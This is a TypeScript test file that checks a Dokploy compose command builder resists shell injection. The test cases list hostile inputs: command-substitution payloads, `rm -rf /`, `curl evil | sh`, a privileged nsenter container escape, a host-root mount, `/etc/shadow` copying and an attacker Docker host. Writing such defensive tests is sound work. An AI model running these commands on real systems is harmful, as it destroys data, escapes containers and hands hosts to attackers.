import { execSync } from "node:child_process";
import { existsSync, rmSync } from "node:fs";
import { createCommand } from "@dokploy/server/utils/builders/compose";
import { parse, quote } from "shell-quote";
import { describe, expect, it } from "vitest";

const MARK = `/tmp/dokploy_compose_pwned_${process.pid}`;

const base = {
	composeType: "docker-compose" as const,
	appName: "compose-app",
	sourceType: "raw" as const,
	command: "",
	composePath: "docker-compose.yml",
};

// createCommand output is interpolated as `docker ${command}` at the deploy
// sink; run `: ${command}` (docker -> no-op) and assert no injection fires.
const runsSafely = (command: string) => {
	if (existsSync(MARK)) rmSync(MARK);
	try {
		execSync(`: ${command}`, { shell: "/bin/sh", stdio: "ignore" });
	} catch {}
	const fired = existsSync(MARK);
	if (existsSync(MARK)) rmSync(MARK);
	return !fired;
};

const PAYLOADS = [
	`$(touch ${MARK})`,
	`\`touch ${MARK}\``,
	`x; touch ${MARK}`,
	`x | touch ${MARK}`,
];

describe("compose createCommand injection", () => {
	it("escapes composePath (docker-compose)", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				sourceType: "github",
				composePath: p,
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	it("escapes composePath (stack deploy)", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				composeType: "stack",
				sourceType: "github",
				composePath: p,
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	it("escapes appName", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				sourceType: "github",
				appName: p,
				composePath: "docker-compose.yml",
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	it("rejects a custom command containing shell control characters", () => {
		for (const bad of [
			"up -d; rm -rf /",
			"up && curl evil | sh",
			"up $(touch x)",
			"up `id`",
		]) {
			expect(() => createCommand({ ...base, command: bad } as any)).toThrow(
				/Invalid characters/,
			);
		}
	});

	it("allows a legitimate custom command", () => {
		const cmd = createCommand({
			...base,
			command: "compose -f docker-compose.yml -p app up -d --build",
		} as any);
		expect(cmd).toBe("compose -f docker-compose.yml -p app up -d --build");
	});

	it("keeps a legitimate composePath intact", () => {
		const cmd = createCommand({
			...base,
			sourceType: "github",
			composePath: "deploy/docker-compose.prod.yml",
		} as any);
		expect(parse(cmd)).toContain("deploy/docker-compose.prod.yml");
		expect(quote(["deploy/docker-compose.prod.yml"])).toBe(
			"deploy/docker-compose.prod.yml",
		);
	});

	it("allows chained docker compose commands with '&&'", () => {
		const cmd = createCommand({
			...base,
			command:
				"compose pull && docker compose down && docker compose up -d --build",
		} as any);
		expect(cmd).toBe(
			"compose pull && docker compose down && docker compose up -d --build",
		);
	});

	it("allows chaining with the legacy 'docker-compose' spelling", () => {
		const cmd = createCommand({
			...base,
			command: "compose pull && docker-compose down",
		} as any);
		expect(cmd).toBe("compose pull && docker-compose down");
	});

	it("rejects a single '&' used for backgrounding", () => {
		expect(() =>
			createCommand({ ...base, command: "compose up -d & sleep 1" } as any),
		).toThrow(/Single '&' is not allowed/);
	});

	it("rejects a malformed '&&&' chain", () => {
		expect(() =>
			createCommand({
				...base,
				command: "compose pull &&& docker compose up -d",
			} as any),
		).toThrow(/Single '&' is not allowed/);
	});

	it("rejects chained segments that are not docker compose invocations", () => {
		expect(() =>
			createCommand({
				...base,
				command: "compose pull && rm -rf /",
			} as any),
		).toThrow(/must strictly start with 'docker compose '/);
	});

	it("rejects an attempted injection smuggled inside a chained segment", () => {
		for (const bad of [
			"compose pull && docker compose up -d; touch /tmp/pwn",
			"compose pull && docker compose up -d $(touch /tmp/pwn)",
			"compose pull && docker compose up -d `touch /tmp/pwn`",
			"compose pull && docker compose up -d | touch /tmp/pwn",
		]) {
			expect(() => createCommand({ ...base, command: bad } as any)).toThrow(
				/Invalid characters/,
			);
		}
	});

	it("rejects a custom command whose first word is not a compose subcommand", () => {
		for (const bad of [
			"run --rm -v /:/hostfs alpine touch /hostfs/tmp/canary",
			"run --rm --privileged --pid=host alpine nsenter -t 1 -m sh",
			"container run --rm -v /:/hostfs alpine true",
			"exec dokploy-postgres psql",
			"cp /etc/shadow x:/tmp",
			"plugin install evil/plugin",
			"build -t x .",
			"up -d",
			"docker compose up -d",
			"-H tcp://attacker:2375 compose up -d",
			"--context evil compose up -d",
			"--config /tmp/x compose up -d",
			'"run" --rm alpine true',
			"composer up",
			"run --rm alpine true && docker compose up -d",
		]) {
			expect(() => createCommand({ ...base, command: bad } as any)).toThrow(
				/must start with 'compose' or 'stack'/,
			);
		}
	});

	it("allows a custom stack deploy command", () => {
		const cmd = createCommand({
			...base,
			composeType: "stack",
			command:
				"stack deploy -c docker-compose.yml app --prune --with-registry-auth",
		} as any);
		expect(cmd).toBe(
			"stack deploy -c docker-compose.yml app --prune --with-registry-auth",
		);
	});

	it("allows a custom command with surrounding whitespace", () => {
		const cmd = createCommand({
			...base,
			command: "  compose -p app up -d  ",
		} as any);
		expect(cmd).toBe("compose -p app up -d");
	});

	it("rejects a chain that only pretends to start with docker compose later in the string", () => {
		expect(() =>
			createCommand({
				...base,
				command: "compose pull && curl evil.sh | docker compose up -d",
			} as any),
		).toThrow(/Invalid characters/);
	});
});
